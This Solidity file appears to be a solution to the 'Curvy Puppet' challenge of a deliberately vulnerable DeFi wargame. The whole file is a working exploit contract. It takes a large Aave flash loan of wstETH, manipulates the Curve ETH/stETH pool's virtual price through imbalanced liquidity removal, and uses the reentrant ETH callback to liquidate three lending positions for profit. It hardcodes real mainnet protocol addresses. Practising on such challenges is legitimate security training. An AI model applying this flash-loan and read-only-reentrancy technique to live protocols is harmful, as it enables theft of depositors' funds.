// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {WETH} from "solmate/tokens/WETH.sol";

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
    function wrap(uint256 amount) external returns (uint256);
}

// aave pool, uniswap doesn't have enough liquidity
interface IPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract Solution {
    IPool constant aavePool = IPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    CurvyPuppetLending immutable lending;
    IERC20 immutable lpToken = IERC20(curvePool.lp_token());
    WETH constant wETH = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IwstETH constant wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    DamnValuableToken immutable token;
    uint256 immutable usersAmount;
    address[] users;

    constructor(CurvyPuppetLending _lending, uint256 userAmount, address[3] memory _users, DamnValuableToken _token)
        payable
    {
        lending = _lending;
        usersAmount = _users.length * userAmount;
        users = _users;
        token = _token;
    }

    function solve(address treasury) external payable {
        // take a loan of 160k wstETH to increase `curvePool.get_virtual_price()`
        address[] memory assets = new address[](1);
        assets[0] = address(wstETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 160000 ether;
        uint256[] memory interestRateModes = new uint256[](1);
        // flashloan calls `executeOperation`
        aavePool.flashLoan(address(this), assets, amounts, interestRateModes, address(this), "", 0);
        token.transfer(treasury, token.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        // get stETH and ETH
        wstETH.unwrap(amounts[0]);
        wETH.withdraw(wETH.balanceOf(address(this)));

        // add liquidity to the pool of ETH and stETH
        stETH.approve(address(curvePool), type(uint256).max);
        curvePool.add_liquidity{value: address(this).balance}([address(this).balance, amounts[0]], 0);

        // remove liquidity taking all stETH
        uint256 lpAmount = lpToken.balanceOf(address(this)) - usersAmount;
        curvePool.remove_liquidity_imbalance([1, curvePool.calc_withdraw_one_coin(lpAmount, 1)], lpAmount);

        // approve to repay the flashloan
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        wstETH.approve(msg.sender, type(uint256).max);

        return true;
    }

    receive() external payable {
        if (msg.sender == address(curvePool)) {
            lpToken.approve(address(permit2), type(uint256).max);
            permit2.approve(address(lpToken), address(lending), type(uint160).max, uint48(block.timestamp + 1));

            lending.liquidate(users[0]);
            lending.liquidate(users[1]);
            lending.liquidate(users[2]);
        }
    }
}
